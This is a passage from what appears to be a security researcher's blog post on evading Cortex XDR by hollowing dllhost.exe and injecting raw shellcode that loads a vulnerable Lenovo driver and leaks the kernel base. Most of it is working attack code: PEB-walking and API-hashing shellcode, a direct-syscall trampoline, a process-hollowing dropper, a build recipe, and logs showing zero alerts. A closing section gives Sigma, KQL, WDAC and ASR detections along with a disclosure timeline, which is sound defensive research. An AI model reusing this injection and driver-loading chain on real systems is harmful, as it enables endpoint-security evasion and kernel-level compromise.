loader didn't tolerate. I tried setting `ctx.Rip = our_entry` to skip
`LdrInitializeThunk` entirely. Same AV. Set both. Same AV. Made the
section RWX. Same AV.

Three days into it I realised: every payload that was a PE crashed before
its entry. Every payload that wasn't a PE didn't get tried.

### Round 7 — abandon the PE, write raw shellcode

A PE payload after process hollowing has fundamentally a lot of state to
inherit correctly from the host. The OS loader's `LdrInitializeThunk`
wants to do work. The payload's startup wants the runtime initialised.
Cumulatively, the dependencies are why "manual map" and "reflective DLL
injection" loaders are 1000+ lines of code each — they reproduce a
meaningful fraction of the OS loader's behaviour to keep the payload PE
happy.

The escape hatch: **don't be a PE**. Be raw bytes. A shellcode with no
imports, no relocations, no sections, no headers. Position-independent.
Resolves everything it needs by walking the PEB. Calls everything via
typedef'd function pointers. Exits via direct `NtTerminateProcess` syscall
so there's no WerFault dialog.

The smallest possible test: 11 bytes.

```
48 b8 ef be ad de 00 00 00 00    mov rax, 0xDEADBEEF
cc                               int 3
```

Allocate RWX in the remote, write those 11 bytes, point `Rip` at the
allocation, resume. Run it:

```
dllhost exit code = 0x00000103   (STILL_ACTIVE — process hung waiting on WerFault)
```

`STILL_ACTIVE` means `WaitForSingleObject` timed out. The `int 3` had
raised an unhandled exception, WerFault was attaching to take a crash
dump, and the process was suspended in the exception path. **The shellcode
had executed.** And Cortex was still silent — process hollowing of
dllhost + RWX alloc + raw shellcode injection had now been independently
confirmed working against the deployed rules.

That moment clarified all the previous debugging. The bypass had been
working since round 5. The broken half was the PE format.

### Round 8 — the real shellcode

Now I needed shellcode that did the driver load. The plan:

1. Walk PEB → find kernel32 and ntdll bases.
2. Resolve `LoadLibraryA` and `GetProcAddress` from kernel32 by walking
   the export directory with an FNV-1a hash of the function name (no
   plaintext strings of well-known APIs).
3. Use `GetProcAddress` to resolve everything else from kernel32.
4. `LoadLibraryA("advapi32.dll")` and resolve the privilege/registry
   functions.
5. Enable `SeLoadDriverPrivilege`.
6. Create `HKLM\SYSTEM\CCS\Services\WinMsr` and write ImagePath, Type,
   Start, ErrorControl.
7. Find `NtLoadDriver` in ntdll, read its SSN from the canonical clean
   stub bytes (`4C 8B D1 B8 <ssn:4>`).
8. Build the `UNICODE_STRING` for the registry path on the stack.
9. `syscall` directly to `NtLoadDriver`.
10. Write a marker file.
11. `syscall` `NtTerminateProcess(-1, 0)` clean exit.

Constraints for shellcode that survives `objcopy -O binary`:

- No imports at all (everything resolved at runtime via PEB walking).
- No string literals in `.rdata` that the compiler will reference with
  RIP-relative relocations against `_GLOBAL_OFFSET_TABLE_` (use stack
  arrays of bytes initialised inline).
- No globals with relocations (linker script discards `.reloc`).
- All API calls via `__attribute__((ms_abi))` typedef'd function pointers.
- Inline asm for the actual `syscall` so GCC doesn't try to be helpful.

#### PEB walk helper

x64 Windows places the PEB pointer at `gs:[0x60]`. From there `PEB.Ldr` is
a linked list of loaded modules. We walk `InMemoryOrderModuleList`,
comparing `BaseDllName.Buffer` (a wide string) against a target ASCII
name, case-insensitive:

```c
typedef struct _PEB_MIN {
    uint8_t  pad0[0x18];
    PEB_LDR *Ldr;
} PEB_MIN;

static PEB_MIN *get_peb(void) {
    PEB_MIN *p;
    __asm__("mov %%gs:0x60, %0" : "=r"(p));
    return p;
}

static int wstreq_i(const uint16_t *a, const char *b) {
    while (*a && *b) {
        uint16_t ca = *a;
        if (ca >= 'A' && ca <= 'Z') ca += 32;
        uint8_t cb = *b;
        if (cb >= 'A' && cb <= 'Z') cb += 32;
        if (ca != cb) return 0;
        a++; b++;
    }
    return *a == 0 && *b == 0;
}

static void *find_module(const char *basename_ascii) {
    PEB_MIN *peb = get_peb();
    if (!peb || !peb->Ldr) return 0;
    LIST_ENTRY *head = &peb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY *cur  = head->Flink;
    while (cur != head) {
        LDR_ENTRY *e = (LDR_ENTRY *)((uint8_t *)cur - sizeof(LIST_ENTRY));
        if (e->BaseDllName.Buffer && wstreq_i(e->BaseDllName.Buffer, basename_ascii))
            return e->DllBase;
        cur = cur->Flink;
    }
    return 0;
}
```

#### Export resolution by FNV-1a hash

We don't want function names like `"LoadLibraryA"` showing up as visible
strings inside the shellcode. FNV-1a is small, fast, table-less, and
trivial to inline:

```c
static uint32_t fnv1a(const char *s) {
    uint32_t h = 0x811C9DC5;
    while (*s) {
        h ^= (uint32_t)(uint8_t)*s++;
        h *= 0x01000193;
    }
    return h;
}

static void *find_export_by_hash(void *dll_base, uint32_t hash) {
    if (!dll_base) return 0;
    DOS_HDR *dos = (DOS_HDR *)dll_base;
    NT_HDR  *nt  = (NT_HDR *)((uint8_t *)dll_base + dos->e_lfanew);
    uint32_t exp_rva = (uint32_t)(nt->DataDirEntries[0] & 0xFFFFFFFF);
    if (!exp_rva) return 0;
    EXP_DIR *exp = (EXP_DIR *)((uint8_t *)dll_base + exp_rva);
    uint32_t *names = (uint32_t *)((uint8_t *)dll_base + exp->AddressOfNames);
    uint16_t *ords  = (uint16_t *)((uint8_t *)dll_base + exp->AddressOfNameOrdinals);
    uint32_t *funcs = (uint32_t *)((uint8_t *)dll_base + exp->AddressOfFunctions);
    for (uint32_t i = 0; i < exp->NumberOfNames; ++i) {
        const char *n = (const char *)((uint8_t *)dll_base + names[i]);
        if (fnv1a(n) == hash)
            return (uint8_t *)dll_base + funcs[ords[i]];
    }
    return 0;
}
```

The hashes themselves are plaintext in the shellcode. That's the standard
tradeoff: you need the function-name → hash table to recover what's being
resolved, but the binary doesn't carry the strings.

#### Reading a system service number

The Windows x64 `ntdll!Nt*` stubs all start with the canonical prologue:

```
4C 8B D1            mov  r10, rcx
B8 ?? ?? 00 00      mov  eax, SSN
F6 04 25 08 03 FE 7F 01   test byte ptr ds:0x7FFE0308, 1
75 03               jne  +3
0F 05               syscall
C3                  ret
```

The four-byte little-endian SSN sits at offset `+4` from the function
address. If the stub is hooked (first bytes are `E9` for `jmp rel32`),
the canonical check fails. Inside hollowed dllhost, ntdll isn't hooked
(we just inherit the legitimate one), so the read works:

```c
static uint32_t read_ssn(void *stub) {
    uint8_t *s = (uint8_t *)stub;
    if (!s) return 0xFFFFFFFF;
    if (s[0] == 0x4C && s[1] == 0x8B && s[2] == 0xD1 && s[3] == 0xB8)
        return *(uint32_t *)(s + 4);
    return 0xFFFFFFFF;
}
```

#### Direct syscall trampoline

We need to dispatch a Windows syscall directly: load `eax` with the SSN,
set `r10` to `rcx` (Windows syscall convention requires this), execute
`syscall`. The `naked` function attribute means GCC emits no
prologue/epilogue, just the raw asm:

```c
static __attribute__((naked))
int64_t do_syscall(uint32_t ssn, void *a1, void *a2, void *a3, void *a4) {
    __asm__(
        "mov  %rcx, %r10\n"      /* save ssn temp */
        "mov  %rdx, %rcx\n"       /* a1 -> rcx */
        "mov  %r8,  %rdx\n"       /* a2 -> rdx */
        "mov  %r9,  %r8 \n"       /* a3 -> r8  */
        "mov  0x28(%rsp), %r9\n"  /* a4 -> r9 (from shadow space) */
        "mov  %r10d, %eax\n"      /* ssn -> eax */
        "mov  %rcx,  %r10\n"      /* MS syscall conv: r10 = rcx */
        "syscall\n"
        "ret\n"
    );
}
```

#### The entry point: full sequence

`sc_entry` is what the dropper points `Rip` at. It does the whole job and
exits cleanly. Stack-allocated byte arrays for all strings so they end up
in `.text` after linker-script consolidation rather than `.rdata` with
relocs:

```c
void __attribute__((section(".text"))) sc_entry(void) {
    /* 1) bases */
    void *k32   = find_module("kernel32.dll");
    void *ntdll = find_module("ntdll.dll");
    if (!k32 || !ntdll) goto die;

    /* 2) kernel32 essentials */
    LoadLibraryA_t   pLL = (LoadLibraryA_t)   find_export_by_hash(k32, fnv1a("LoadLibraryA"));
    GetProcAddress_t pGP = (GetProcAddress_t) find_export_by_hash(k32, fnv1a("GetProcAddress"));
    if (!pLL || !pGP) goto die;

    GetCurrentProcess_t pGCP = (GetCurrentProcess_t)pGP(k32, "GetCurrentProcess");
    CloseHandle_t       pCH  = (CloseHandle_t)      pGP(k32, "CloseHandle");
    CreateFileA_t       pCFA = (CreateFileA_t)      pGP(k32, "CreateFileA");
    WriteFile_t         pWF  = (WriteFile_t)        pGP(k32, "WriteFile");
    CreateDirectoryA_t  pCDA = (CreateDirectoryA_t) pGP(k32, "CreateDirectoryA");

    /* 3) load advapi32 + resolve */
    char advapi[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
    void *adv = pLL(advapi);
    OpenProcessToken_t      pOPT = (OpenProcessToken_t)      pGP(adv, "OpenProcessToken");
    LookupPrivilegeValueA_t pLPV = (LookupPrivilegeValueA_t) pGP(adv, "LookupPrivilegeValueA");
    AdjustTokenPrivileges_t pATP = (AdjustTokenPrivileges_t) pGP(adv, "AdjustTokenPrivileges");
    RegCreateKeyExA_t       pRCK = (RegCreateKeyExA_t)       pGP(adv, "RegCreateKeyExA");
    RegSetValueExA_t        pRSV = (RegSetValueExA_t)        pGP(adv, "RegSetValueExA");
    RegCloseKey_t           pRCl = (RegCloseKey_t)           pGP(adv, "RegCloseKey");

    /* 4) SeLoadDriverPrivilege */
    void *tok = 0;
    pOPT(pGCP(), TOKEN_ADJUST_PRIVS | TOKEN_QUERY, &tok);
    char se_load_drv[] = {'S','e','L','o','a','d','D','r','i','v','e','r',
                          'P','r','i','v','i','l','e','g','e',0};
    LUID luid = {0};
    pLPV(0, se_load_drv, &luid);
    TOKEN_PRIVS_ONE tp = { 1, luid, SE_PRIVILEGE_ENABLED };
    pATP(tok, 0, &tp, sizeof tp, 0, 0);
    pCH(tok);

    /* 5) service registry */
    char key_path[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n',
                       't','C','o','n','t','r','o','l','S','e','t','\\','S',
                       'e','r','v','i','c','e','s','\\','W','i','n','M','s','r',0};
    void *hKey = 0;
    pRCK(HKEY_LOCAL_MACHINE, key_path, 0, 0, REG_OPTION_NON_VOLATILE,
         KEY_ALL_ACCESS, 0, &hKey, 0);

    char img_path[] = {'\\','?','?','\\','C',':','\\','T','o','o','l','s','\\',
                       'L','n','v','M','S','R','I','O','.','s','y','s',0};
    char img_name[]  = {'I','m','a','g','e','P','a','t','h',0};
    pRSV(hKey, img_name, 0, REG_EXPAND_SZ, (const uint8_t *)img_path, sizeof img_path);

    uint32_t type_val = 1, start_val = 3, errctl_val = 1;
    char type_name[]  = {'T','y','p','e',0};
    char start_name[] = {'S','t','a','r','t',0};
    char ec_name[]    = {'E','r','r','o','r','C','o','n','t','r','o','l',0};
    pRSV(hKey, type_name,  0, REG_DWORD, (const uint8_t *)&type_val,   4);
    pRSV(hKey, start_name, 0, REG_DWORD, (const uint8_t *)&start_val,  4);
    pRSV(hKey, ec_name,    0, REG_DWORD, (const uint8_t *)&errctl_val, 4);
    pRCl(hKey);

    /* 6) NtLoadDriver SSN */
    void *p_NtLoadDriver = find_export_by_hash(ntdll, fnv1a("NtLoadDriver"));
    uint32_t ssn_load = read_ssn(p_NtLoadDriver);
    if (ssn_load == 0xFFFFFFFF) goto die;

    /* 7) UNICODE_STRING for "\Registry\Machine\System\CCS\Services\WinMsr" */
    static const uint16_t reg_path_w[] = {
        '\\','R','e','g','i','s','t','r','y','\\','M','a','c','h','i','n','e',
        '\\','S','y','s','t','e','m','\\','C','u','r','r','e','n','t','C','o','n',
        't','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\',
        'W','i','n','M','s','r', 0
    };
    uint16_t buf[80];
    int i; for (i = 0; reg_path_w[i] && i < 79; ++i) buf[i] = reg_path_w[i]; buf[i] = 0;

    UNICODE_STR us;
    us.Length        = (uint16_t)(i * 2);
    us.MaximumLength = (uint16_t)((i + 1) * 2);
    us.Buffer        = buf;

    /* 8) syscall NtLoadDriver(&us) */
    int64_t status = do_syscall(ssn_load, &us, 0, 0, 0);

    /* 9) marker file with hex NTSTATUS */
    /* ... CreateFileA + WriteFile sequence with "[v9 sc] NtLoadDriver status=0xXXXXXXXX" ... */

die:
    /* 10) clean exit via NtTerminateProcess(-1, 0) */
    void *p_NtTerm = find_export_by_hash(ntdll, fnv1a("NtTerminateProcess"));
    uint32_t ssn_term = read_ssn(p_NtTerm);
    if (ssn_term != 0xFFFFFFFF) {
        do_syscall(ssn_term, (void *)(intptr_t)-1, (void *)0, 0, 0);
    }
    for (;;) __asm__ volatile("hlt");
}
```

#### Linker script

Standard MinGW produces a PE with many sections. For raw shellcode we
consolidate everything reachable from `sc_entry` into one `.text`:

```ld
OUTPUT_FORMAT(pei-x86-64)
ENTRY(sc_entry)
SECTIONS {
    . = 0;
    .text : {
        *(.text*)
        *(.rdata*)
        *(.rodata*)
        *(.data*)
    }
    /DISCARD/ : {
        *(.bss*)
        *(.idata*)
        *(.pdata*)
        *(.xdata*)
        *(.reloc*)
        *(.eh_frame*)
        *(.comment*)
        *(.gnu*)
        *(.note*)
    }
}
```

Build:

```bash
x86_64-w64-mingw32-gcc -ffreestanding -fPIC -nostdlib -nostartfiles \
  -fno-stack-protector -fno-unwind-tables -fno-asynchronous-unwind-tables \
  -mno-red-zone -Os -Wno-unused-function -fno-jump-tables \
  -Wl,-T,sc.ld,-e,sc_entry \
  shellcode.c -o sc.elf

x86_64-w64-mingw32-objcopy -O binary --only-section=.text sc.elf sc.bin
```

Result: `sc.bin` is **2752 bytes**. `sc_entry` ends up at offset `+0x1ac`
within the blob (consequence of where the linker placed it after the
helpers); I extract that offset from the symbol table at embed time so the
dropper knows where to point `Rip`.

#### Dropper

Tiny — does the hollow shape and reads the marker file:

```c
#include "shellcode_embedded.h"   /* defines SC_BYTES[], SC_LEN, SC_ENTRY_OFFSET */

int main(void) {
    bp_init(BP_ETW_PATCH | BP_INDIRECT_SYSCALLS | BP_NTDLL_UNHOOK_SELECTIVE);

    /* spawn dllhost SUSPENDED */
    STARTUPINFOA si = { .cb = sizeof si };
    PROCESS_INFORMATION pi = { 0 };
    char cmd[] = "C:\\Windows\\System32\\dllhost.exe";
    CreateProcessA(cmd, cmd, NULL, NULL, FALSE,
                   CREATE_SUSPENDED | CREATE_NO_WINDOW,
                   NULL, NULL, &si, &pi);

    /* RWX alloc in remote */
    LPVOID remote = VirtualAllocEx(pi.hProcess, NULL, SC_LEN,
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_EXECUTE_READWRITE);

    /* write shellcode */
    WriteProcessMemory(pi.hProcess, remote, SC_BYTES, SC_LEN, NULL);

    /* point Rip at sc_entry */
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rip = (DWORD64)(ULONG_PTR)remote + SC_ENTRY_OFFSET;
    ctx.Rcx = ctx.Rip;
    SetThreadContext(pi.hThread, &ctx);

    /* go */
    ResumeThread(pi.hThread);
    WaitForSingleObject(pi.hProcess, 10000);

    DWORD ec = 0;
    GetExitCodeProcess(pi.hProcess, &ec);
    printf("dllhost exit code = 0x%08lx\n", ec);

    /* read marker */
    HANDLE h = CreateFileA("C:\\Tools\\v9_status.txt",
                           GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    /* ... ReadFile + print ... */
    return ec == 0 ? 0 : 100;
}
```

### Runtime results — the full chain in action

```
[v9] bp_init=0
[v9] dllhost PID=30232 SUSPENDED
[v9] remote alloc @ 0x26d5fa40000 (RWX, 2752 bytes)
[v9] shellcode written, entry @ 0x26d5fa401ac
[v9] resumed; waiting up to 10s...

=== dllhost PID=30232 exit code = 0x00000000 (0)  wait=0 ===

---- C:\Tools\v9_status.txt ----
[v9 sc] NtLoadDriver status=0x00000000
---- end ----

==================== verify ====================
PoC MSR LSTAR leak:
  [+] MSR_LSTAR (KiSystemCall64) = 0xfffff806ac8bc040
  [+] Possible kernel bases by build:
      Win11 23H2 22631   base ≈ 0xfffff806ac209500  (LSTAR - 0x6b2b40)
      Win11 24H2 26100   base ≈ 0xfffff806ac209400  (LSTAR - 0x6b2c40)
      Win10 22H2 19045   base ≈ 0xfffff806ac1fe000  (LSTAR - 0x6be040)
  [+] LSTAR canonical-kernel — read primitive works end-to-end.
```

`NtLoadDriver` returned `0x00000000`. The driver is now mapped in the
kernel from inside a hollowed `dllhost.exe`. The MSR-read IOCTL
(`0x9c402084`) on the device returned `KiSystemCall64`'s canonical
kernel-mode address, which puts the kernel base for this build (`26200`)
at `0xfffff806ac209400`. End to end.

**Cortex XDR alerts: zero.** Across every round from 5 onward, no
prevention dialog, no informational alert, no telemetry-only event
surfaced to the console.

## Defender takeaway

This is detectable. None of the deployed rules I tripped against are
stupid — they're just not aggressive enough on this exact shape yet.

What would have caught the round-9 chain:

### Sigma rule — `NtLoadDriver` from `dllhost`

`dllhost.exe` legitimately doesn't load kernel drivers. A behavioural
rule that correlates a `dllhost` process with a subsequent `NtLoadDriver`
call in the same process is the simplest possible signature for the
process-hollowing variant of BYOVD:

```yaml
title: NtLoadDriver invoked from dllhost.exe
id: hollow-dllhost-ntloaddriver-2026
status: experimental
description: |
  The dllhost.exe Microsoft signed binary does not load kernel drivers
  in normal operation. A NtLoadDriver syscall observed from a dllhost
  process is consistent with the process-hollowing + raw shellcode +
  direct syscall variant of BYOVD.
references:
  - https://trexnegro.github.io/posts/cortex-byovd-lnvmsrio-full-chain/
author: trexnegr0
date: 2026-06-04
logsource:
  product: windows
  service: system
detection:
  driver_load:
    EventID: 6   # ImageLoad of a kernel-mode driver
  parent_dllhost:
    ParentImage|endswith: '\dllhost.exe'
  condition: driver_load and parent_dllhost
level: high
```

### KQL — anomalous `dllhost` instances

On a normal Windows 11 host, every `dllhost.exe` instance runs as a COM
surrogate for a well-defined CLSID and is spawned by `svchost.exe`
(specifically the `DcomLaunch` service). Any `dllhost` that is not a child
of `svchost` and not started with `/Processid:{...}` is suspicious by
definition. A query for Microsoft Defender for Endpoint:

```kql
DeviceProcessEvents
| where FileName =~ "dllhost.exe"
| where ProcessCommandLine !contains "/Processid:"
    or InitiatingProcessFileName !=~ "svchost.exe"
| project Timestamp, DeviceName, ProcessId, ParentProcessName,
          ProcessCommandLine, AccountName
```

### Sigma — driver loaded from `C:\Tools\` or any non-system path

The loader needs to drop the driver somewhere. The default Lenovo
installer would put it under `C:\Program Files\Lenovo\` — a `LnvMSRIO.sys`
loaded from anywhere else is a strong signal:

```yaml
title: LnvMSRIO.sys loaded from non-standard path
id: lnvmsrio-nonstandard-path-2026
status: experimental
detection:
  driver_load:
    EventID: 6
    ImageFileName|endswith: 'LnvMSRIO.sys'
  legitimate_path:
    ImagePath|contains: '\Lenovo\'
  condition: driver_load and not legitimate_path
level: high
```

### WDAC deny rule for LnvMSRIO v3.1.0.36

While waiting for Microsoft to add the binary to the HVCI block list in a
future quarterly update, defenders running App Control can add the rule
themselves:

```xml
<FileAttrib ID="ID_FILEATTRIB_LNVMSRIO_V3"
            FriendlyName="Lenovo LnvMSRIO.sys 3.1.0.36 (CVE-2025-8061 + sibling findings A-E)"
            FileName="LnvMSRIO.sys"
            MinimumFileVersion="0.0.0.0"
            MaximumFileVersion="3.1.0.36" />
<!-- Authentihash SHA-1   = b74a2e4f0a40748a9dc136cd7eaceecbfe40bba0 -->
<!-- Authentihash SHA-256 = bcc5394705e552d0312592c507b71a6bd921782f82bb5b4acc721d2f056030a5 -->
<!-- File SHA-256          = 7023f08c9f99076a5fb82a0f661847e2951800f095fca1793a0e6bd9c949b478 -->
```

### KQL — port-I/O write to power/reset registers

If the goal is to detect *use* of the new findings rather than the driver
load itself, Cortex/MDE can hunt for `\\.\WinMsrDev` opens followed by
suspicious IOCTL traffic. The IOCTLs of interest are:

```
0x9c40a0d8   port-I/O WRITE 8-bit
0x9c40a0dc   port-I/O WRITE 16-bit
0x9c40a0e0   port-I/O WRITE 32-bit
0x9c40a148   PCI-config WRITE
```

A custom kernel callback or ETW-based hook on `DeviceIoControl(\\.\WinMsr`
`Dev, 0x9c40a0??)` would be the surgical detection.

### ASR rule — block abuse of exploited vulnerable signed drivers

The Defender ASR rule
`56a863a9-875e-4185-98a7-b882c64b5ce5` is "Block abuse of exploited
vulnerable signed drivers". It's not a substitute for an explicit App
Control deny, but it's the lowest-friction control if WDAC isn't deployed:

```
Set-MpPreference -AttackSurfaceReductionRules_Ids 56a863a9-875e-4185-98a7-b882c64b5ce5 \
                 -AttackSurfaceReductionRules_Actions Enabled
```

## Disclosure timeline

| Date | Event |
|---|---|
| 2025-09-?? | Lenovo publishes patch (Dispatcher v3.1.0.41) for CVE-2025-8061 |
| 2026-05-12 | Microsoft HVCI block list build — `LnvMSRIO.sys` Authentihash absent |
| 2026-06-04 | Static audit complete; runtime chain confirmed end-to-end against Cortex XDR build 26200 |
| 2026-06-04 | Lenovo PSIRT report filed (Findings A-E) |
| 2026-06-04 | Microsoft MSRC HVCI block-list request filed |
| TBD | Vendor triage / patch / CVE assignment |
| TBD | This post goes public — currently held until Lenovo and MSRC have had reasonable time to act |

## Source

🔗 Companion code for the loader half of this post:
[`TREXNEGRO/Research/dllhost-hollow-shellcode/`](https://github.com/TREXNEGRO/Research/tree/master/dllhost-hollow-shellcode){:target="_blank"}

🔗 The IOCTL enumeration tool (publishable separately, useful for any
signed-driver audit):
[`TREXNEGRO/Research/ioctl_enum/`](https://github.com/TREXNEGRO/Research/tree/master/ioctl_enum){:target="_blank"}

Authorised lab use only. Findings A-E filed with Lenovo PSIRT 2026-06-04;
do not weaponise against systems you do not own or have written
authorisation to test.

— SixSixSix
